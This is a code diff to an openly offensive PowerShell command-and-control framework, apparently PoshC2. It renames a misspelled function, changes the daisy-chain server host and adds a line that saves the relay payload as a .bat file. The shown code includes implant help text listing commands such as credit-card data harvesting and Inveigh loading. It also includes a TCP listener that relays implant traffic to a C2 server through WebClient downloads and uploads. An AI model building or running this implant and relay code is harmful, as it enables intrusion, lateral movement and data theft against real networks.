@@ -131,7 +131,7 @@ function Implant-Handler
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " StartAnotherImplant" -ForegroundColor Green 
         write-host " StartAnotherImplantWithProxy" -ForegroundColor Green 
-        write-host " Invoke-DaisyChain -port 4444 -daisyserver" -ForegroundColor Green
+        write-host " Invoke-DaisyChain -port 4444 -daisyserver 192.168.1.1" -ForegroundColor Green
         write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
         write-host " Get-MSHotfix|Where-Object {$_.Installedon -gt ((Get-Date).Adddays(-2))}|Select-Object -Property Computername, KBArticle,InstalledOn, HotFixID, InstalledBy|ft -autosize" -ForegroundColor Green 
         write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
@@ -368,7 +368,7 @@ function start-scriptblock
     &`$scripblock
 }
 
-function Get-WebclientDiasy (`$Cookie) {
+function Get-WebclientDaisy (`$Cookie) {
     `$wc = New-Object System.Net.WebClient; 
     `$wc.UseDefaultCredentials = `$true; 
     `$wc.Proxy.Credentials = `$wc.Credentials;
@@ -380,7 +380,7 @@ function Get-WebclientDiasy (`$Cookie) {
 
 
 `$ListPort = $port
-`$serverhost = "http://$daisyserver/"
+`$serverhost = "http://$ipv4address/"
 `$ListPort = new-object System.Net.IPEndPoint([ipaddress]::any,`$ListPort) 
 `$listener = New-Object System.Net.Sockets.TcpListener(`$ListPort)
 `$listener.Start()
@@ -422,7 +422,7 @@ while (`$running){
                     `$getreq = `$EncodedText.GetString(`$bytes,0, 3)
 
                     if (`$getreq -eq "GET")  {
-                        `$pm = (Get-WebclientDiasy -Cookie `$cookie).DownloadString(`$urlget)
+                        `$pm = (Get-WebclientDaisy -Cookie `$cookie).DownloadString(`$urlget)
                     } else
                     {
                         `$linenum=0
@@ -444,7 +444,7 @@ while (`$running){
                         `$RandomURI = `$EncodedText.GetString(`$bytes,0,15)
                         `$newbyte = `$bytes[15..`$t]
                         `$urlpost = `$url + `$RandomURI
-                        `$pm = (Get-WebclientDiasy -Cookie `$cookie).UploadData("`$urlpost", `$newbyte)
+                        `$pm = (Get-WebclientDaisy -Cookie `$cookie).UploadData("`$urlpost", `$newbyte)
 
                     }
 
@@ -484,7 +484,8 @@ Connection: close
 
 "@
 
-$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf )
+$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
+[IO.File]::WriteAllLines("$FolderPath\payloads\daisyserver.bat", $fdsf)
 $CompressedStream = New-Object IO.MemoryStream
 $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
 $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
